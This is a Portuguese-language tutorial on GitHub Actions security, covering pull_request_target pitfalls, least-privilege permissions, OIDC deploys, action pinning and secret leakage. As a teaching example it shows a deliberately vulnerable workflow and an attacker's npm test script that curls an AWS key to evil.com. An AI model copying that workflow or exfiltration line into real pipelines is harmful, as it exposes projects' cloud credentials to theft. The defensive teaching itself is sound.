# Segurança em pipelines

> **Quando ler:** antes de adicionar secret a qualquer workflow, ao escrever workflow que roda em PR, ao deployar para cloud (AWS/GCP/Azure), quando alguém menciona "OIDC" e você não sabe o que é, antes de copiar action de fonte desconhecida.

## Índice

1. [O modelo de ameaça: o que pode dar errado](#o-modelo-de-ameaça-o-que-pode-dar-errado)
2. [`pull_request` vs `pull_request_target`: a armadilha mais comum](#pull_request-vs-pull_request_target-a-armadilha-mais-comum)
3. [Permissions: princípio do menor privilégio](#permissions-princípio-do-menor-privilégio)
4. [OIDC: deploy em cloud sem secrets long-lived](#oidc-deploy-em-cloud-sem-secrets-long-lived)
5. [Pinning: por que tags como `@v4` não bastam](#pinning-por-que-tags-como-v4-não-bastam)
6. [Vazamento de secrets: como acontece e como evitar](#vazamento-de-secrets-como-acontece-e-como-evitar)
7. [Erros comuns de iniciante](#erros-comuns-de-iniciante)

---

## O modelo de ameaça: o que pode dar errado

CI/CD é alvo atrativo: tem credenciais para deploy, acesso ao código antes da publicação, capacidade de modificar artefatos. Comprometer pipeline = comprometer várias coisas de uma vez.

Os ataques comuns:

| Ataque | Como acontece | Impacto |
|---|---|---|
| **RCE via PR de fork** | Atacante envia PR cujo workflow executa código dele com secrets | Vazamento de secrets, deploy malicioso |
| **Action comprometida** | Tag mutável (`@v4`) é movida para commit malicioso | Mesma coisa — execução arbitrária |
| **Secrets em logs** | `echo $SECRET` ou erro de shell expõe valor | Token vazado para qualquer um com leitura de Actions |
| **Permissões amplas no GITHUB_TOKEN** | Workflow comprometido escreve em qualquer lugar do repo | Sabotagem, push de código malicioso |
| **Long-lived cloud creds** | Token AWS exposto via vazamento | Acesso prolongado à conta cloud |

A defesa é em camadas. Cada uma sozinha não basta, mas juntas reduzem drasticamente o risco.

## `pull_request` vs `pull_request_target`: a armadilha mais comum

Esses dois eventos parecem similares mas têm **modelo de segurança oposto**. Confundir leva a vulnerabilidade séria.

### `pull_request` (default — seguro)

- Workflow roda no contexto do **fork** (código do PR)
- `GITHUB_TOKEN` é **read-only**
- **Sem acesso a secrets** do repo base
- Atacante que abre PR com código malicioso só consegue rodar build no próprio fork — não pode roubar nada

```yaml
on: pull_request

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test    # roda código do PR, mas sem secrets, sem permissões
```

Isso é seguro. CI normal de PR.

### `pull_request_target` (perigoso)

- Workflow roda no contexto do **repo base** (não do fork)
- **Acesso a secrets**
- `GITHUB_TOKEN` com permissões normais

Por que existir? Casos legítimos:
- Comentar no PR (precisa de write em PR)
- Auto-label, auto-assign
- Deploy de preview de docs (precisa de credenciais)

### Onde a armadilha mora

Se você combinar `pull_request_target` com `actions/checkout` do **código do fork**:

```yaml
# WORKFLOW VULNERÁVEL — RCE
on: pull_request_target

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}   # ← código do fork!
      - run: npm test                                       # ← roda código do fork
        env:
          AWS_ACCESS_KEY: ${{ secrets.AWS_ACCESS_KEY }}    # ← com secret!
```

Atacante:
1. Faz fork do seu repo.
2. Modifica `package.json` para rodar script malicioso em `npm test`:
   ```json
   "scripts": { "test": "curl -X POST evil.com -d \"$AWS_ACCESS_KEY\"" }
   ```
3. Abre PR.
4. Workflow roda. Faz checkout do código do PR. Roda `npm test` com seu secret.
5. Secret vazado. Atacante tem acesso à sua AWS.

Esse é um padrão de RCE bem documentado. Vários projetos open source de empresas grandes já caíram nele.

### Regra de ouro

> Em `pull_request_target`, **NUNCA faça checkout do código do PR** no mesmo job que tem secrets.

Se precisa de ambas as coisas (testar código do PR + ter secret), **separe em jobs diferentes**:

```yaml
on: pull_request_target

jobs:
  # Job 1: testa código do PR sem secret
  test-pr-code:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test
      # SEM secret aqui

  # Job 2: comenta no PR (com secret) sem rodar código do fork
  comment-result:
    needs: test-pr-code
    if: ${{ always() }}
    runs-on: ubuntu-latest
    steps:
      - uses: actions/github-script@v7
        with:
          github-token: ${{ secrets.GITHUB_TOKEN }}
          script: |
            github.rest.issues.createComment({
              issue_number: context.payload.pull_request.number,
              owner: context.repo.owner,
              repo: context.repo.repo,
              body: 'Tests passed!'
            })
      # NÃO faz checkout do PR — usa só API
```

### Heurística simples

Se você precisa de `pull_request_target`, **leia 3 vezes o que está fazendo**. Se hesitar, provavelmente está errado.

## Permissions: princípio do menor privilégio

`GITHUB_TOKEN` é gerado automaticamente para cada workflow. Por default, GitHub dá permissões amplas a ele:

```
contents: write
issues: write
pull-requests: write
... e mais
```

Isso é problemático: workflow comprometido pode escrever em todo o repo.

### Restringir explicitamente

Declare `permissions:` no nível do workflow (default para todos os jobs):

```yaml
name: CI

on: [push, pull_request]

permissions:
  contents: read   # mínimo: ler o código
```

Workflow inteiro só tem permissão de ler. Tentativa de escrever falha.

### Granular por job

Quando alguns jobs precisam mais que outros:

```yaml
permissions:
  contents: read

jobs:
  test:
    runs-on: ubuntu-latest
    # herda contents: read
    steps: [...]
  
  release:
    permissions:
      contents: write       # criar release
      id-token: write       # OIDC para deploy
    runs-on: ubuntu-latest
    steps: [...]
```

Só o job `release` tem write. `test` continua read-only.

### Permissões disponíveis

Lista parcial:

| Permission | Para quê |
|---|---|
| `actions: read/write` | Trigger workflows, acessar histórico |
| `contents: read/write` | Ler código, fazer push |
| `issues: read/write` | Comentar, fechar issues |
| `pull-requests: read/write` | Comentar PR, fazer merge |
| `id-token: write` | OIDC (próxima seção) |
| `packages: read/write` | GitHub Packages |
| `security-events: write` | Code scanning, dependabot |

Lista completa: docs.github.com/rest/permissions.

### Recomendação prática

Comece com:

```yaml
permissions:
  contents: read
```

Adicione o que precisar, na granularidade certa. Se workflow não consegue fazer algo, adiciona explicitamente.

## OIDC: deploy em cloud sem secrets long-lived

### O problema

Padrão antigo: para deploy em AWS, você guardava `AWS_ACCESS_KEY_ID` e `AWS_SECRET_ACCESS_KEY` em `secrets`. Workflow usava esses tokens.

Problemas:
- **Rotação manual** (lembrar de trocar a cada 90 dias?)
- **Vazamento permanente** se algum dia escapar para log/repo público
- **Difícil restringir escopo** — token vale para tudo que IAM permitiu

### A solução: OIDC

OpenID Connect permite que o GitHub Actions **assine um token JWT efêmero** que prova "este workflow está rodando em `myorg/myrepo`, branch `main`". A cloud confia na assinatura do GitHub e troca o token por credenciais temporárias (15min - 1h).

Sem secrets long-lived. Sem rotação manual. Sem token útil se vazar (já expirou).

### Configuração em alto nível

#### 1. Configure trust na cloud (uma vez por conta/projeto)

AWS, exemplo:
- Cria identity provider apontando para GitHub OIDC URL
- Cria IAM role com trust policy que permite `sts:AssumeRoleWithWebIdentity` se o `sub` (subject) do token bater com `repo:myorg/myrepo:ref:refs/heads/main`

#### 2. No workflow, peça o token e use

```yaml
on: push

permissions:
  id-token: write     # ESSENCIAL — sem isso, OIDC não funciona
  contents: read

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/gh-deploy
          aws-region: us-east-1

      # daqui em diante, AWS CLI funciona com creds temporárias
      - run: aws s3 ls
```

A action `configure-aws-credentials` faz o fluxo: pede token OIDC do GitHub → troca na AWS por credenciais temporárias → exporta como env vars do AWS CLI.

#### 3. Restringa por branch/environment no trust policy

Trust policy na AWS pode restringir quais workflows podem assumir a role:

```json
{
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:sub": "repo:myorg/myrepo:ref:refs/heads/main"
    }
  }
}
```

Só workflow rodando em `main` consegue assumir. PR de fork tentando assumir essa role: nego.

Para múltiplos repos/branches:

```json
"StringLike": {
  "token.actions.githubusercontent.com:sub": [
    "repo:myorg/myrepo:ref:refs/heads/main",
    "repo:myorg/myrepo:ref:refs/heads/release/*",
    "repo:myorg/myrepo:environment:production"
  ]
}
```

### Vantagens recap

- Sem secret armazenado no GitHub
- Sem rotação manual
- Trust policy define exatamente quem pode assumir o quê
- Token é válido por minutos, não anos

GCP, Azure, HashiCorp Vault, Cloudflare têm equivalente. Para qualquer cloud "sério", OIDC é o padrão moderno.

### Quando ainda usar secrets

- API externa que não suporta OIDC (npm publish, Slack webhook, third-party APIs)
- Bootstrap inicial (criar a infra que vai hospedar OIDC)
- Tokens que não são para cloud principal (Codecov, etc)

Mas para cloud, OIDC primeiro.

## Pinning: por que tags como `@v4` não bastam

Quando você escreve:

```yaml
- uses: actions/checkout@v4
```

`@v4` é uma **tag**. Tags em git são **mutáveis** — apontam para um commit, mas o mantenedor pode movê-las.

### O cenário de ataque

1. Você usa `actions/checkout@v4`. Hoje aponta para commit `abc123`.
2. Atacante compromete a conta do mantenedor (ou um mantenedor vira malicioso).
3. Move a tag `v4` para um commit `def456` que adiciona código malicioso.
4. Próxima execução do seu workflow puxa o `def456`.
5. Código malicioso roda com seu `GITHUB_TOKEN`, acessa secrets, exfiltra.

Isso já aconteceu. Caso famoso: tj-actions/changed-files (2024-2025) — tag movida, milhares de workflows comprometidos.

### Solução: pin por SHA

```yaml
- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11   # v4.1.1
```

SHA é imutável. Mesmo se atacante comprometer a conta, ele não consegue mover esse SHA — você está fixado num commit específico que nunca muda.

### Tradeoffs

| Estratégia | Segurança | Manutenção |
|---|---|---|
| `@main` ou `@master` | Péssima | Zero |
| `@v4` (tag major) | Frágil | Zero — auto-atualiza |
| `@v4.1.1` (tag exata) | Frágil — tag pode ser movida | Pequeno |
| `@b4ffde65...` (SHA) | Forte | Médio — precisa atualizar manualmente |

### Compromisso prático

- **Actions oficiais (`actions/*`, `github/*`):** tag major (`@v4`) é aceitável para a maioria dos casos. Confiança no GitHub.
- **Actions de organizações reconhecidas (`docker/*`, `aws-actions/*`):** tag major OK para CI; SHA para deploy crítico.
- **Actions de terceiros / pessoais:** **sempre SHA**. Sem exceção.

### Renovate / Dependabot

Configure Renovate ou Dependabot para criar PR automaticamente quando há atualização. Você revisa e merge — atualização deliberada, não cega.

```yaml
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "github-actions"
    directory: "/"
    schedule:
      interval: "weekly"
```

Dependabot abre PR como "bump actions/checkout from `abc` to `def`". Você revisa o changelog, merge.

## Vazamento de secrets: como acontece e como evitar

### Vazamento via log direto

```yaml
- run: echo ${{ secrets.NPM_TOKEN }}    # ❌
```

GitHub mascara secrets em logs (substitui por `***`), mas o masking não é infalível. E a regra de ouro é nunca dar a chance.

### Vazamento via transformação

GitHub mascara o valor exato. Mas se você transforma:

```yaml
- run: echo ${{ secrets.NPM_TOKEN }} | base64    # ❌ — base64 não é mascarado
```

Saída em base64 não bate com o valor original, masking não pega. Token vaza.

Outras transformações comuns:
- `head -c 10` — pega primeiros chars
- `cut -d. -f1` — pega parte
- Reverso, codificação, JWT manipulation

### Vazamento por erro de shell

```yaml
- run: |
    set -x      # debug — imprime cada comando
    deploy --token ${{ secrets.DEPLOY_TOKEN }}   # ❌ — set -x imprime token
```

`set -x` mostra cada comando antes de rodar — incluindo o token expandido.

### Vazamento via output

```yaml
- run: echo "token=${{ secrets.X }}" >> $GITHUB_OUTPUT    # ❌
```

Outputs podem ser vistos por outros workflows ou logs.

### Como passar secret com segurança

```yaml
- run: deploy --token "$DEPLOY_TOKEN"
  env:
    DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

Variável de ambiente:
- Não aparece em log (com `set -x`, mostra `$DEPLOY_TOKEN`, não o valor)
- Mascaramento funciona se imprimir acidentalmente
- Não é interpolado em shell injection

### Environments para secrets sensíveis

GitHub Environments permitem:
- Required reviewers (humano aprova antes de continuar)
- Wait timer
- Deployment branches (só `main` pode usar `production` env)

```yaml
jobs:
  deploy:
    environment:
      name: production
      url: https://api.example.com
    runs-on: ubuntu-latest
    steps:
      - run: ./deploy.sh
        env:
          PROD_SECRET: ${{ secrets.PROD_SECRET }}    # secret do environment
```

Workflow pausa pedindo aprovação. Útil para deploy de produção.

## Erros comuns de iniciante

### "Coloquei `${{ secrets.X }}` direto no `run:` shell e funcionou"

Funcionou hoje. Se o valor do secret ou o input do PR contém metacaractere de shell (`$`, `;`, backtick), você abre RCE. Sempre via `env:`.

### "`pull_request_target` é igual a `pull_request`, mais poderoso"

É diferente. `pull_request_target` roda no contexto do base com secrets. Se você fizer checkout do PR sem cuidado, abre RCE. Use só quando entende o trade-off.

### "Permissions amplas pra evitar dor de cabeça"

Workflow comprometido vira "carro chefe" para sabotar repo. Restrinja para `contents: read` por padrão.

### "Pino só `actions/checkout`, deixo as outras flutuando"

Atacante vai pelo elo mais fraco. Se a regra é "pinar", aplicar uniformemente. Use Renovate/Dependabot para automação.

### "Tenho `AWS_ACCESS_KEY_ID` em secret há 2 anos, nunca rotacionei"

Considere comprometido até prova em contrário. Migre para OIDC e revogue o key antigo.

### "Vi um `pull_request_target` em projeto X copiei pro meu"

Sem entender o porquê, copiar é roleta russa. Se você não sabe explicar a diferença para `pull_request`, **não use** `pull_request_target`.

### "Workflow falhou, dei `set -x` no shell pra debugar"

`set -x` imprime cada comando, incluindo valores expandidos de variáveis (e secrets). Ative só temporariamente, em ambiente seguro, e nunca em workflow que vai pra produção.

### "Coloquei secret no `vars` por engano (não em secrets)"

`vars` (variáveis não-secret) **aparecem em log normalmente**. Não ofuscam. Vazaram permanentemente. Crie como `secrets`, não `vars`.

---

**Princípio que resume tudo:** segurança em pipeline é em camadas — `permissions` mínimas, OIDC em vez de long-lived, pinning de actions, secrets via env, separação de jobs em `pull_request_target`. Cada camada sozinha não impede tudo, mas juntas reduzem drasticamente a superfície. Iniciante deve internalizar: **PR de fork pode conter código malicioso de propósito**. Cada decisão nos workflows passa por essa lente.
